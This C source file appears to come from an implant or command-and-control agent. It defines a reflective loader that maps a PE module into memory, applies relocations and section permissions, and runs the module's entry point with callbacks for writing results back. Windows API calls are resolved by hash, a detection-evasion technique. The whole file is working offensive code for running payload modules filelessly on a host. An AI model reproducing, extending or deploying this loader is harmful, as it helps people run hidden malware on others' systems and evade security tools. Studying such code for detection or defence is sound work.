#ifdef LOAD_AND_LISTEN
#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"
#include "../../includes/parser/parser.h"


void ModuleWrite4(PVOID ctx, DWORD val) {
	ParserWrite4((ParserWrite *)ctx, val);
}

void ModuleWriteStr(PVOID ctx, PCHAR str, DWORD len) {
	ParserWriteBytes((ParserWrite *)ctx, (PBYTE)str, len);
}

HMODULE ModuleGetModule(DWORD hash) {
	return GetModule(hash);
}

FARPROC ModuleGetProc(HMODULE mod, DWORD hash) {
	return GetProc(mod, hash);
}

HMODULE ModuleLoadLibraryA(PCHAR name) {
	return ldr->win32->LoadLibraryA(name);
}

BOOL ModuleFreeLibrary(HMODULE mod) {
	return ldr->win32->FreeLibrary(mod);
}


BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
	DBGA("[+] Mapping Module into memory\n");
	
	PIMAGE_OPTIONAL_HEADER pOpt = OPT_HEADER(info.Data);
	PIMAGE_SECTION_HEADER sec   = SECTION_HEADER(info.Data);
	WORD numSections            = FILE_HEADER(info.Data)->NumberOfSections;

	SIZE_T TotalSize  = pOpt->SizeOfImage;
	PVOID BaseAddress = NULL;
	DBGA("[+] Calling NtAllocate\n");
	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(CurrentProcess(), &BaseAddress, 0, &TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		DBGA("[*] NtAllocate Failed\n");
		return FALSE;
	}
	if (!BaseAddress) {
		DBGA("[*] BaseAddress NULL\n");

		return FALSE;
	}

	LdrMemcpy(BaseAddress, info.Data, pOpt->SizeOfHeaders);
	LdrCopySections(BaseAddress, info.Data, sec, numSections);
	LdrProcessRelocs(BaseAddress, info.Data);
	LdrSetSectionPerms(BaseAddress, sec, numSections);


	pModule mod = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Module));
	if (!mod)
		return FALSE;

	mod->size              = sizeof(Module);
	mod->Version           = 1;
	mod->ModuleWrite4      = ModuleWrite4;
	mod->ModuleWriteStr    = ModuleWriteStr;
	mod->ModuleGetModule   = ModuleGetModule;
	mod->ModuleGetProc     = ModuleGetProc;
	mod->ModuleLoadLibraryA = ModuleLoadLibraryA;
	mod->ModuleFreeLibrary = ModuleFreeLibrary;

	ParserWrite *p = ParserInitWrite();
	if (!p) {
		ldr->win32->LocalFree(mod);
		return FALSE;
	}

	pModuleEntry entry = (pModuleEntry)((PBYTE)BaseAddress + pOpt->AddressOfEntryPoint);
	DBGA("[*] Running Module\n");
	if (!entry(mod, (PVOID)p, NULL, 0)) {
		DBGA("[!] Module returned failure\n");
	}

	ParserClearWrite(p);
	ldr->win32->LocalFree(mod);

	SIZE_T size = 0;
	ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &BaseAddress, &size, MEM_RELEASE);


	return TRUE;
}
#endif